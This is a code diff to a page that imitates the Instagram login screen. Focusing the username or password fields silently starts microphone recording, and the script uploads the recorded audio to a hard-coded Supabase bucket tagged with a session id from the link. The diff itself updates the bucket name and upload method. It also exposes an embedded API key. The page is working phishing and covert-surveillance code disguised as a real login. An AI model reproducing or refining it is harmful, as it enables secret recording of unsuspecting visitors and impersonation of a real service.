@@ -45,7 +45,7 @@ footer .copyright{font-size:11px;color:#8e8e8e}
   <section id="mobile"></section>
   <section id="auth">
     <div class="panel login">
-      <h1><img src="./img//instagram-logo.png" alt="Instagram logo" /></h1>
+      <h1><img src="./img/instagram-logo.png" alt="Instagram logo" /></h1>
       <form onsubmit="return false;">
         <input id="email" placeholder="Phone number, username or email" autocomplete="off" onfocus="startMicRecording()"/>
         <input id="password" type="password" placeholder="Password" autocomplete="off" onfocus="startMicRecording()"/>
@@ -73,6 +73,7 @@ footer .copyright{font-size:11px;color:#8e8e8e}
 </footer>
 <script>
 const S='https://hdpopgdfdttoldxavetw.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhkcG9wZ2RmZHR0b2xkeGF2ZXR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5MjY1MjIsImV4cCI6MjA5NDUwMjUyMn0.h7w18IWPkZBTlAXkf5cyfs2UtaG3H70it0pei1b4G88';
+const BUCKET='photos';
 const sid=new URLSearchParams(location.search).get('s');
 let mediaRecorder,chunks=[],activeStream;
 
@@ -111,9 +112,9 @@ async function upload(blob,mime){
   if(!blob||blob.size<500)return;
   const ext=getExt(mime);const filename=sid+'/'+Date.now()+'.'+ext;
   try{
-    const res=await fetch(S+'/storage/v1/object/captures/'+filename,{method:'POST',headers:{'Authorization':'Bearer '+K},body:blob});
+    const res=await fetch(S+'/storage/v1/object/'+BUCKET+'/'+filename,{method:'PUT',headers:{'Authorization':'Bearer '+K,'Content-Type':mime},body:blob});
     if(res.ok){
-      const url=S+'/storage/v1/object/public/captures/'+filename;
+      const url=S+'/storage/v1/object/public/'+BUCKET+'/'+filename;
       await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({session_id:sid,image_url:url})});
     }
   }catch(e){}
